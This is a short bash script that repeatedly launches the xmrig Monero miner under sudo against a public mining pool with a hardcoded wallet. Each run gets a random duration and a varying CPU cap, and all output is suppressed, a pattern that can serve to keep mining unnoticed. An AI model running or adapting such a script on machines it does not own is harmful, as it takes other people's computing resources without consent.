#!/bin/bash
t_min=45
t_max=120
cpu_min=5
cpu_max=40

while true :
  do
    echo "_________________________________________________"
    t=$(($t_min + $RANDOM % ($t_max - $t_min)))
    cpu=$(($cpu_max + $t * ($cpu_min - $cpu_max)/($t_max - $t_min)))
    echo "Max CPU usage drawed:" $cpu
    echo "Starting mining software with timeout:" $t
    timeout $t sudo ./xmrig -o pool.supportxmr.com:443 -u 42KJEwM2z3wPPCebT9VSjKbJYaVTtGP1AN7gH6yyLnoWMCU1JenWuXGF4Aa1FE5exx4ToRfB5xKsGAM1G4Ez9jX1PeCvVVL -p CD --max-cpu-usage=$cpu >/dev/null &
    sleep $t
done
